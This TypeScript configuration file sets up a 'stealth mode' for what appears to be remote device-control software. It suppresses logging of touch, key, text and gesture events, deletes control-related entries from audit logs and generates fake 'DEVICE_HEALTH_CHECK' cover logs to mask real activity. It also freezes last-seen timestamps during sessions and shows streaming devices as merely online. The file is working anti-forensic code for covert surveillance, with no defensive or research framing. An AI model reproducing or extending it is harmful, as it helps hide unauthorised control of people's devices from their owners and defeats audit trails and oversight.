/**
 * Security Configuration for Remote Control Stealth Mode
 * 
 * This configuration controls how the system hides remote control activities
 * from logs, UI, and any monitoring systems.
 */

export const securityConfig = {
  /**
   * Enable stealth mode globally
   * When true, all remote control activities are hidden
   */
  stealthModeEnabled: true,

  /**
   * Prevent logging of control activities
   */
  suppressControlLogging: true,

  /**
   * Hide 'streaming' status in device lists
   * Devices will always show as 'online' instead of 'streaming'
   */
  hideStreamingStatus: true,

  /**
   * Sanitize audit logs to remove control-related entries
   */
  sanitizeAuditLogs: true,

  /**
   * Generate cover logs to mask actual activities
   */
  generateCoverLogs: true,

  /**
   * Actions that should never be logged
   */
  suppressedLogActions: [
    'CONTROL_INPUT',
    'REMOTE_CONTROL_START',
    'REMOTE_CONTROL_STOP',
    'TOUCH_EVENT',
    'KEY_EVENT',
    'TEXT_INPUT',
    'SCREEN_INTERACTION',
    'SWIPE',
    'TAP',
    'GESTURE',
  ],

  /**
   * WebSocket message types that should not be logged
   */
  suppressedMessageTypes: [
    'control-input',
    'touch',
    'swipe',
    'key',
    'text',
    'input',
    'interaction',
    'gesture',
  ],

  /**
   * Time window (ms) to keep stealth mode active after last activity
   */
  stealthModeTimeoutMs: 300000, // 5 minutes

  /**
   * Maximum number of audit logs to keep (to prevent accumulation)
   */
  maxAuditLogs: 50,

  /**
   * Cleanup interval (ms) for stealth mode data
   */
  cleanupIntervalMs: 600000, // 10 minutes

  /**
   * Hide control capabilities from API responses
   * When true, can_control permission is not exposed in certain contexts
   */
  hideControlCapabilities: false,

  /**
   * Freeze device timestamps during active sessions
   * Prevents last_seen updates that could indicate activity
   */
  freezeTimestampsDuringControl: true,

  /**
   * Cover log settings
   */
  coverLog: {
    enabled: true,
    type: 'DEVICE_HEALTH_CHECK',
    frequency: 'on_activity', // 'on_activity' | 'periodic' | 'never'
  },
};

/**
 * Check if a message type should be suppressed from logging
 */
export function shouldSuppressLogging(messageType: string): boolean {
  if (!securityConfig.suppressControlLogging) return false;
  
  const lowerType = messageType.toLowerCase();
  return securityConfig.suppressedMessageTypes.some(type => 
    lowerType.includes(type)
  );
}

/**
 * Check if an action should be removed from audit logs
 */
export function shouldSanitizeAuditAction(action: string): boolean {
  if (!securityConfig.sanitizeAuditLogs) return false;
  
  const upperAction = action.toUpperCase();
  return securityConfig.suppressedLogActions.some(sensitiveAction =>
    upperAction.includes(sensitiveAction)
  );
}

/**
 * Check if stealth mode is globally enabled
 */
export function isStealthModeEnabled(): boolean {
  return securityConfig.stealthModeEnabled;
}

export default securityConfig;
